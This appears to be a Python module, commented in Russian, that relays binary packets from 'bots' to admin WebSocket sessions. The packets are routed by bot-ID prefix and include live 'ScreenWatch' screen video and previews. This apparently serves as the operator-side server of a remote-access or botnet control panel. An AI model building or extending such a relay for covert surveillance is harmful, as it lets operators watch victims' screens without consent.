import asyncio
from logs import Log as logger

class ConnectionManager:
    """Управление очередями отправки и туннелями доступа пользователей"""

    def __init__(self):
        self.active_connections = {}  # {login: [ws]}
        self.tunnels = {}             # {prefix: [ws]}
        self.queues = {}              # {ws: Queue}
        self.send_tasks = {}          # {ws: Task}
        self.bot_prefix_cache = {}    # {raw_id: prefix_str}

    async def connect(self, ws, login, user):
        """Регистрация WebSocket и запуск воркера отправки"""
        await ws.accept()
        # Увеличиваем maxsize, чтобы тяжелые превью не дропались сразу
        queue = asyncio.Queue(maxsize=200) 
        self.queues[ws] = queue
        self.send_tasks[ws] = asyncio.create_task(self._socket_writer(ws, queue))
        
        self.active_connections.setdefault(login, []).append(ws)
        prefix = user.get("prefix", "NONE")
        
        self.tunnels.setdefault(prefix, []).append(ws)
        if user.get("role") == "admin":
            self.tunnels.setdefault("ALL", []).append(ws)
            
        logger.info(f"[API] [+] {login} вошел в туннель {prefix}")

    def broadcast_packet_sync(self, packet: bytes):
        """Синхронная рассылка пакета всем заинтересованным админам"""
        if len(packet) < 6: return
        
        id_len, mod_len = packet[0], packet[1]
        raw_id = packet[6:6 + id_len]
        
        module_bytes = packet[6 + id_len : 6 + id_len + mod_len]
        # Превью и видео требуют разного подхода к очередям
        is_video = b"ScreenWatch" in module_bytes
        is_preview = b"Preview" in module_bytes

        prefix = self._get_bot_prefix(raw_id)
        targets = set(self.tunnels.get(prefix, [])) | set(self.tunnels.get("ALL", []))

        for ws in targets:
            q = self.queues.get(ws)
            if not q: continue
            
            # Если это живое видео и очередь забита — чистим её (дропаем кадры)
            if is_video and q.full():
                self._clear_queue(q)
            
            try:
                q.put_nowait(packet)
            except asyncio.QueueFull:
                # Если превью не влезло (админ на очень медленном интернете), просто пропускаем
                if not is_preview: logger.debug("[API] Queue full, dropping packet")

    async def _socket_writer(self, ws, queue):
        """Цикл отправки байтов в сокет"""
        try:
            while True:
                packet = await queue.get()
                await ws.send_bytes(packet)
                queue.task_done()
        except: pass
        finally:
            logger.debug("[API] Writer closed")

    def disconnect(self, ws, login):
        """Полная очистка ссылок на закрытый сокет"""
        if ws in self.send_tasks:
            self.send_tasks[ws].cancel()
            del self.send_tasks[ws]
        
        self.queues.pop(ws, None)
        for group in self.active_connections.values():
            if ws in group: group.remove(ws)
        for group in self.tunnels.values():
            if ws in group: group.remove(ws)

    def _get_bot_prefix(self, raw_id):
        if raw_id in self.bot_prefix_cache:
            return self.bot_prefix_cache[raw_id]
        try:
            bid_str = raw_id.decode(errors='ignore')
            prefix = bid_str.split('-')[0] if '-' in bid_str else "NONE"
            self.bot_prefix_cache[raw_id] = prefix
            return prefix
        except: return "NONE"

    def _clear_queue(self, q):
        while q.full():
            try: q.get_nowait()
            except asyncio.QueueEmpty: break